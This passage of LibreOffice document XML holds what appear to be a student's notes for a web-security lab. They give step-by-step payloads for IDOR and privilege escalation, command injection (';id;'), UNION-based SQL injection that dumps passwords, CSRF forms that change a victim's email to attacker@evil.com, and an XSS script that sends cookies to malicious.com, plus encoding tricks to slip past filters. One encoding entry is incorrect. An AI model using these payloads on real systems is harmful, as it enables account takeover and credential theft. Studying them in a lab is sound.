    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001e844a" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00261a16" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002c410c" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002ca858" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0034c5ce" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold"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8e3a9" style:font-size-asian="10.5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316b9c" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties style:font-size-asian="12.25pt"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="000f6d77"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="000f9631"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="00115215"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties officeooo:rsid="00127c04"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:font-size="14pt" style:font-size-asian="12.25pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="001a3ac0" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="001c294e" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="001d6be6" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="004644f7" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties officeooo:rsid="0029f7a1"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties fo:color="#008000" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:background-color="#ffffff" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="0034c5ce" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="00359e57"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties officeooo:rsid="003db42f"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties officeooo:rsid="003f9c0c"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:color="#800000" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:color="#e50000" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:color="#0451a5" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:color="#098658" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:color="#0000ff" loext:opacity="10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Access Control</text:p>
      <text:p text:style-name="P36">1. Vertical priviledge escalation usuing URL bruteforcing and cookie modification</text:p>
      <text:p text:style-name="P41">1. bruteforce the url using zap. As per the instructions in the question.</text:p>
      <text:p text:style-name="P41">2. check the response in the zap by checking the response size is 0, or state is reflected. Or status code 301.</text:p>
      <text:p text:style-name="P41">3. after identifying the url payload. Add the name as per given in the question.</text:p>
      <text:p text:style-name="P41"><text:line-break/>Second part says:<text:line-break/>1. access the url. Which will not get loaded. <text:line-break/>2. modify the cookie in the storage of inspect page.</text:p>
      <text:p text:style-name="P41">3. reload the page. The page will open.</text:p>
      <text:p text:style-name="P41">4. and change the marks of the required person.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P37">2. Horizontal privilege escalation through IDOR</text:p>
      <text:p text:style-name="P42">1. try to modify the url using zap. As per instructed in the question.</text:p>
      <text:p text:style-name="P42">2. in zap, the response will show reflected state.</text:p>
      <text:p text:style-name="P42">3. check those responses data.</text:p>
      <text:p text:style-name="P42">4. identify the required the answer.</text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P37">3. Another priviledge escalation based on user role<text:line-break/><text:span text:style-name="T3">1. ecplore the website for updating grades.</text:span></text:p>
      <text:p text:style-name="P42">2. use zap for this question.</text:p>
      <text:p text:style-name="P42">3. login back to Laksh and get his session id.</text:p>
      <text:p text:style-name="P42">4. copy paste the session id to the request of Rajesh and change role to admin and then send.</text:p>
      <text:p text:style-name="P42">5. this should change the marks to 100.</text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P12">Vertical Priviledge Escalation (Url modification and Cookie modification)</text:p>
      <text:p text:style-name="P1">Url obfuscation technique may have been used. Need to use zap to find the correct. Check the response status code in zap to identify.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Cookie modification after login with correct user, can give admin access. Check for that.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">IDOR based</text:p>
      <text:p text:style-name="P50">Make use of zap to fuzz the url as per suggested in the question.<text:line-break/>It can in range of number. <text:span text:style-name="T1">See the response body size. Also may be state reflected will help.</text:span></text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P3">Priviledge escalation based on user role</text:p>
      <text:p text:style-name="P53">Take the cookie (session id) of first user(Laksh) after login and tracking in zap.</text:p>
      <text:p text:style-name="P53">Edit and modify the request in zap. </text:p>
      <text:p text:style-name="P56">Paste the cookie (session id) into the url which will update marks for that user.<text:line-break/><text:span text:style-name="T2">Also change the role to admin</text:span>.<text:line-break/><text:span text:style-name="T2">This will update the marks for that user.</text:span></text:p>
      <text:p text:style-name="P57"><text:soft-page-break/></text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P57">Authentication</text:p>
      <text:p text:style-name="P35">Identifying password for admin with IP blocking defense</text:p>
      <text:p text:style-name="P40">1. try first the website by login for several no of times.</text:p>
      <text:p text:style-name="P40">2. suppose after 5 attempts it is blocking the webiste and displaying the message.</text:p>
      <text:p text:style-name="P40">3. check the error message. What is the different in the response when password is wrong.</text:p>
      <text:p text:style-name="P40">4. Use python code</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P35">Identifying username and then password</text:p>
      <text:p text:style-name="P63">1. <text:span text:style-name="T24">find the difference in the response returned in the html page when correct username and wrong password is given. Try multiple times. In how many attempts you got different error message.</text:span></text:p>
      <text:p text:style-name="P64"><text:span text:style-name="T23">2. </text:span><text:span text:style-name="T25">Use python code to generate the strings, and then use it in zap.</text:span></text:p>
      <text:p text:style-name="P65"><text:span text:style-name="T23">3. </text:span><text:span text:style-name="T26">fuzz the request for username and for identifying the response in zap, check the response size, reflected state, redirected etc.</text:span></text:p>
      <text:p text:style-name="P66"><text:span text:style-name="T23">4. after getting username, use the python code to search for password.</text:span></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P20">Vulnerable 2MFA with OTP fuzzing</text:p>
      <text:p text:style-name="P73">1. Identify the requests using zap.</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">2. first API change to generate OTP for admin. </text:span><text:span text:style-name="T7">Use edit and resend feature in zap to</text:span><text:span text:style-name="T3"> Change the url parameter value to admin </text:span><text:span text:style-name="T7">for create otp</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P73">3. second API change to fuzz OTP for admin.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P21">Vulnerable in url by changing url parameter for resetting password</text:p>
      <text:p text:style-name="P21">1. <text:span text:style-name="T3">just change the url parameter value to admin, see if u can access</text:span></text:p>
      <text:p text:style-name="P66"/>
      <text:p text:style-name="P66"/>
      <text:p text:style-name="P66"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P67">Command Injection</text:p>
      <text:p text:style-name="P13">Simple command injection: <text:span text:style-name="T3"><text:line-break/>1. try to read the php line which is given in Q and then put the id command in the parameter which is accepting the string, if done correctly it will print the output.</text:span></text:p>
      <text:p text:style-name="P74">Payload: ;id; <text:s text:c="2"/>or “;</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P13">Blind Command Injection:</text:p>
      <text:p text:style-name="P22">1. try to read the php line given in Q and put the id command in string accepting parameter and save it to file. (This must be given in Q).</text:p>
      <text:p text:style-name="P29">2. “; id &gt; ./cmdout.txt; “</text:p>
      <text:p text:style-name="P22"><text:soft-page-break/></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P68">SQL Injection</text:p>
      <text:p text:style-name="P14">Authentication Bypass</text:p>
      <text:p text:style-name="P54">1. try <text:s text:c="2"/><text:span text:style-name="T12">admin' – abc <text:line-break/></text:span> it comments out the password field in sql query</text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P10">Data exfiltration using Union based</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T8">1. First find the field which is returning some data from the database in sime page.<text:line-break/>2. Understand what are the fields it has in the table(may be mentioned in the Q). After understanding the columns and its type. Use Union to concatenate the hidden table data as below.</text:span><text:line-break/><text:span text:style-name="T8">3.</text:span><text:span text:style-name="T13"> ' UNION SELECT sno, concat(username, " abc ", password), NULL, sno from users -- <text:line-break/> <text:s text:c="3"/>' UNION SELECT NULL, concat(username, " abc ", password), NULL, NULL from users --<text:line-break/> <text:s text:c="3"/>' UNION SELECT 2, password, 4, 1 from users where username = 'admin' – abc<text:line-break/> <text:s text:c="3"/>' UNION SELECT 2, password, 4, 1 from users where username = "admin" -- abc<text:line-break/><text:line-break/>Null matches with any datatype</text:span></text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P11"><text:span text:style-name="T17">Data exfiltration using Blind SQL<text:line-break/></text:span><text:span text:style-name="T13">1. Can be done using python code<text:line-break/></text:span><text:span text:style-name="T14">2. change the php session id, take it from inpector storage after login</text:span></text:p>
      <text:p text:style-name="P78">3. write the sql payload in the python code and run it to see.</text:p>
      <text:p text:style-name="P78"/>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55"><text:s/></text:p>
      <text:p text:style-name="P58">CSRF</text:p>
      <text:p text:style-name="P16">1.<text:span text:style-name="T21">Simple CSRF with no defensive using csrf token<text:line-break/>a. </text:span><text:span text:style-name="T5">See the inpect html code for making this below payload, check for required field and put it in this form.</text:span></text:p>
      <text:p text:style-name="P26">b. See the network request payload made from network tab in inpect.</text:p>
      <text:p text:style-name="P28">c. after framing the payload, click on view exploit. Check if it working.</text:p>
      <text:p text:style-name="P28">d. if working, then click on deliver to victim. Refrsh the page, and flag is displayed.</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P26">&lt;form action="http://localhost:30000/updateEmail/"</text:p>
      <text:p text:style-name="P27">method="POST"&gt;</text:p>
      <text:p text:style-name="P27">&lt;input type="hidden" name="new_email"</text:p>
      <text:p text:style-name="P27">value="attacker@evil.com" /&gt;</text:p>
      <text:p text:style-name="P27">&lt;/form&gt;</text:p>
      <text:p text:style-name="P27">&lt;script&gt;</text:p>
      <text:p text:style-name="P27">document.forms[0].submit();</text:p>
      <text:p text:style-name="P27">&lt;/script&gt;</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P18">2. CSRF attack with improper csrf token implementation (token not tied to user session)</text:p>
      <text:p text:style-name="P18">a. <text:span text:style-name="T6">Same as above</text:span></text:p>
      <text:p text:style-name="P19"><text:soft-page-break/><text:span text:style-name="T6">b. </text:span><text:span text:style-name="T3">generated csrf token will be there in the inspect html code, search it and copy it and use it below payload.</text:span></text:p>
      <text:p text:style-name="P24">c. follow above steps to verify the working and deliver to victim.</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P23">&lt;form action="http://localhost:30000/updateEmail/"</text:p>
      <text:p text:style-name="P23">method="POST"&gt;</text:p>
      <text:p text:style-name="P23">&lt;input type="hidden" name="new_email"</text:p>
      <text:p text:style-name="P23">value="attacker@evil.com" /&gt;</text:p>
      <text:p text:style-name="P23">&lt;input type="hidden" value="a12ceabd2579a6af12bf345149b3e2c686b543c86962507130c58abd22455ed1" readonly="" name="csrftoken" required=""&gt;</text:p>
      <text:p text:style-name="P23">&lt;/form&gt;</text:p>
      <text:p text:style-name="P23">&lt;script&gt;</text:p>
      <text:p text:style-name="P23">document.forms[0].submit();</text:p>
      <text:p text:style-name="P23">&lt;/script&gt;</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P24"><text:span text:style-name="T12">3.</text:span> <text:span text:style-name="T12">CSRF token is paired with a cookie</text:span></text:p>
      <text:p text:style-name="P24">a. check for the page from which a cookie can be set. Eg: search bar in participant page.</text:p>
      <text:p text:style-name="P24">b. see in the below payload, the ‘csrftoken’ word is kept same for both the cookie and the token. this word is matching with the form element in the inspect.</text:p>
      <text:p text:style-name="P25">c. follow above steps to verify the working and deliver to victim.</text:p>
      <text:p text:style-name="P24"><text:s/></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">&lt;form action="http://localhost:30000/updateEmail/"</text:p>
      <text:p text:style-name="P23">method="POST"&gt;</text:p>
      <text:p text:style-name="P23">&lt;input type="hidden" name="new_email" value="attacker@evil.com" /&gt;</text:p>
      <text:p text:style-name="P23">&lt;input required type="hidden" name="csrftoken"</text:p>
      <text:p text:style-name="P23">value="mycat" /&gt;</text:p>
      <text:p text:style-name="P23">&lt;input type="submit" value="Update Email" /&gt;</text:p>
      <text:p text:style-name="P23">&lt;/form&gt;</text:p>
      <text:p text:style-name="P23">&lt;img</text:p>
      <text:p text:style-name="P23">src="http://localhost:30000/participants/?courseid=4&amp;search=Set-Cookie:%20csrftoken=mycat%3b%20Same</text:p>
      <text:p text:style-name="P23">Site=None" onerror="document.forms[0].submit()"&gt;</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P58">XSS</text:p>
      <text:p text:style-name="P4">1. <text:span text:style-name="T18">Reflected XSS</text:span></text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T19">a. just introduce the payload for XSS<text:line-break/>b. Check whether it is working for me or not<text:line-break/>c. Copy the url from address bar and submit in the exploit<text:line-break/>d. </text:span>/participants/?courseid=4&amp;search=%3Cscript%3Ealert(%22hacked%22)%3C%2Fscript%3E</text:p>
      <text:p text:style-name="P30"><text:soft-page-break/></text:p>
      <text:p text:style-name="P32">decoded: &lt;script&gt;alert(“hacked”)&lt;/script&gt;</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P17">Stored XSS</text:p>
      <text:p text:style-name="P31">a. introduce the stored XSS script in some page</text:p>
      <text:p text:style-name="P31">b. check by refreshing the page if that is popping the alert for me or not. <text:line-break/>c. just send the url in exploit server where stored XSS is available</text:p>
      <text:p text:style-name="P31">d. /grades/?courseid=4</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P9">Steal cookie by storing in logs<text:line-break/><text:span text:style-name="T3">a.</text:span> <text:span text:style-name="T4">Use image src for loading the url automatically from the slide</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T10">b. no encoding just paste the payload in participants search box. Check if it is executed. It will be blank below the search box. (remember no encoding required)<text:line-break/>c. Copy the url and paste it in exploit server.</text:span><text:line-break/><text:span text:style-name="T10">d</text:span><text:span text:style-name="T4">.</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T3">/participants/?courseid=4&amp;search=%3Cscript%3Evar+i%3Dnew+Image%28%29%3B+i.src%3D%22http%3A%2F%2F0.0.0.0%3A30001%2F%3Fcookie%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E</text:span></text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P76">decoded payload:</text:p>
      <text:p text:style-name="P31">&lt;script&gt;</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T9">var </text:span><text:span text:style-name="T3">img = new Image();</text:span></text:p>
      <text:p text:style-name="P31">img.src = "http://www.malicious.com/steal.php?cookie=" + document.cookie;</text:p>
      <text:p text:style-name="P31">&lt;/script&gt;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">2. Reflected XSS with active blacklist filtration<text:line-break/><text:span text:style-name="T3">Eg: alert can’t be used. Or script can’t be used</text:span></text:p>
      <text:p text:style-name="P33">1. try the search box in participants page.</text:p>
      <text:p text:style-name="P33">2. use the payload, hit enter, if it pops the alert for u. It is the correct payload.</text:p>
      <text:p text:style-name="P33">3. remember one encoding is done by browser</text:p>
      <text:p text:style-name="P33">4. copy the url from the address bar and submit it in the exploit server box.</text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T11">5. for payload try double encoding, triple encoding etc. Refer below.</text:span><text:span text:style-name="T3"><text:line-break/>1. try double encoding, triple encoding etc for <text:line-break/>&lt;script&gt;alert(“hacked”)&lt;/script&gt;</text:span></text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30">% = %25</text:p>
      <text:p text:style-name="P30">&lt; <text:span text:style-name="T28">= %3C</text:span></text:p>
      <text:p text:style-name="P30">&gt; <text:span text:style-name="T28">= %3F</text:span></text:p>
      <text:p text:style-name="P30">/ <text:span text:style-name="T28">= %2F</text:span></text:p>
      <text:p text:style-name="P30">encode all characters<text:line-break/>remember one encoding is done by browser<text:line-break/></text:p>
      <text:p text:style-name="P34"><text:span text:style-name="T30"><text:line-break/>&lt;script&gt;alert(“hacked”)&lt;/script&gt;<text:line-break/>Single encode:<text:line-break/></text:span><text:soft-page-break/><text:span text:style-name="T29">%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%68%61%63%6B%65%64%22%29%3C%2F%73%63%72%69%70%74%3E</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33">Double encode:<text:line-break/>%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2522%2568%2561%2563%256B%2565%2564%2522%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P4"><text:span text:style-name="T3">below payload is triple encoded:<text:line-break/></text:span><text:span text:style-name="T15">/participants/?courseid=5&amp;search=%25253C%252573%252563%252572%252569%252570%252574%25253E%252561%25256C%252565%252572%252574%252528%252527%252568%252561%252563%25256B%252565%252564%252527%252529%25253B%25253C%25252F%252573%252563%252572%252569%252570%252574%25253E</text:span></text:p>
      <text:p text:style-name="P79"/>
      <text:h text:style-name="P5" text:outline-level="3"><text:span text:style-name="T15">Step-by-Step Encoding for Each Character </text:span><text:span text:style-name="T16">of alert</text:span></text:h>
      <text:list xml:id="list941353597" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P85"><text:span text:style-name="Strong_20_Emphasis">Original Characters and First-Level Encodings:</text:span></text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">a</text:span> → <text:span text:style-name="Source_20_Text">%61</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">l</text:span> → <text:span text:style-name="Source_20_Text">%6C</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">e</text:span> → <text:span text:style-name="Source_20_Text">%65</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">r</text:span> → <text:span text:style-name="Source_20_Text">%72</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">t</text:span> → <text:span text:style-name="Source_20_Text">%74</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P85"><text:span text:style-name="Strong_20_Emphasis">Second-Level Encoding</text:span> (encode each <text:span text:style-name="Source_20_Text">%</text:span> from the first-level encoding):</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">%61</text:span> → <text:span text:style-name="Source_20_Text">%2561</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">%6C</text:span> → <text:span text:style-name="Source_20_Text">%256C</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">%65</text:span> → <text:span text:style-name="Source_20_Text">%2565</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">%72</text:span> → <text:span text:style-name="Source_20_Text">%2572</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">%74</text:span> → <text:span text:style-name="Source_20_Text">%2574</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P85"><text:span text:style-name="Strong_20_Emphasis">Third-Level Encoding</text:span> (encode each <text:span text:style-name="Source_20_Text">%</text:span> from the second-level encoding):</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">%2561</text:span> → <text:span text:style-name="Source_20_Text">%252561</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">%256C</text:span> → <text:span text:style-name="Source_20_Text">%25256C</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">%2565</text:span> → <text:span text:style-name="Source_20_Text">%252565</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P86"><text:span text:style-name="Source_20_Text">%2572</text:span> → <text:span text:style-name="Source_20_Text">%252572</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P85"><text:span text:style-name="Source_20_Text">%2574</text:span> → <text:span text:style-name="Source_20_Text">%252574</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P79">%252561%25256C%252565%252572%252574</text:p>
      <text:p text:style-name="P79"/>
      <text:h text:style-name="P5" text:outline-level="3"><text:span text:style-name="T15">Step-by-Step Encoding for </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15">"hacked"</text:span></text:span></text:h>
      <text:list xml:id="list1317333077" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P87"><text:span text:style-name="Strong_20_Emphasis">Original Characters and First-Level Encodings:</text:span></text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">h</text:span> → <text:span text:style-name="Source_20_Text">%68</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:soft-page-break/><text:span text:style-name="Source_20_Text">a</text:span> → <text:span text:style-name="Source_20_Text">%61</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">c</text:span> → <text:span text:style-name="Source_20_Text">%63</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">k</text:span> → <text:span text:style-name="Source_20_Text">%6B</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">e</text:span> → <text:span text:style-name="Source_20_Text">%65</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">d</text:span> → <text:span text:style-name="Source_20_Text">%64</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P87"><text:span text:style-name="Strong_20_Emphasis">Second-Level Encoding</text:span> (encode each <text:span text:style-name="Source_20_Text">%</text:span> from the first-level encoding):</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%68</text:span> → <text:span text:style-name="Source_20_Text">%2568</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%61</text:span> → <text:span text:style-name="Source_20_Text">%2561</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%63</text:span> → <text:span text:style-name="Source_20_Text">%2563</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%6B</text:span> → <text:span text:style-name="Source_20_Text">%256B</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%65</text:span> → <text:span text:style-name="Source_20_Text">%2565</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%64</text:span> → <text:span text:style-name="Source_20_Text">%2564</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P87"><text:span text:style-name="Strong_20_Emphasis">Third-Level Encoding</text:span> (encode each <text:span text:style-name="Source_20_Text">%</text:span> from the second-level encoding):</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%2568</text:span> → <text:span text:style-name="Source_20_Text">%252568</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%2561</text:span> → <text:span text:style-name="Source_20_Text">%252561</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%2563</text:span> → <text:span text:style-name="Source_20_Text">%252563</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%256B</text:span> → <text:span text:style-name="Source_20_Text">%25256B</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P88"><text:span text:style-name="Source_20_Text">%2565</text:span> → <text:span text:style-name="Source_20_Text">%252565</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P87"><text:span text:style-name="Source_20_Text">%2564</text:span> → <text:span text:style-name="Source_20_Text">%252564</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P79">%252568%252561%252563%25256B%252565%252564</text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P79"/>
      <text:h text:style-name="P5" text:outline-level="3">Original String: <text:span text:style-name="Source_20_Text">"script"</text:span></text:h>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">1. Encoding each character:</text:h>
      <text:list xml:id="list4090049191" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P90"><text:span text:style-name="Source_20_Text">s</text:span> → <text:span text:style-name="Source_20_Text">%73</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P90"><text:span text:style-name="Source_20_Text">c</text:span> → <text:span text:style-name="Source_20_Text">%63</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P90"><text:span text:style-name="Source_20_Text">r</text:span> → <text:span text:style-name="Source_20_Text">%72</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P90"><text:span text:style-name="Source_20_Text">i</text:span> → <text:span text:style-name="Source_20_Text">%69</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P90"><text:span text:style-name="Source_20_Text">p</text:span> → <text:span text:style-name="Source_20_Text">%70</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P89"><text:span text:style-name="Source_20_Text">t</text:span> → <text:span text:style-name="Source_20_Text">%74</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="P6" text:outline-level="4">3. Second-Level URL Encoding:</text:h>
      <text:list xml:id="list2217076700" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P92"><text:span text:style-name="Source_20_Text">%73</text:span> → <text:span text:style-name="Source_20_Text">%2573</text:span></text:p>
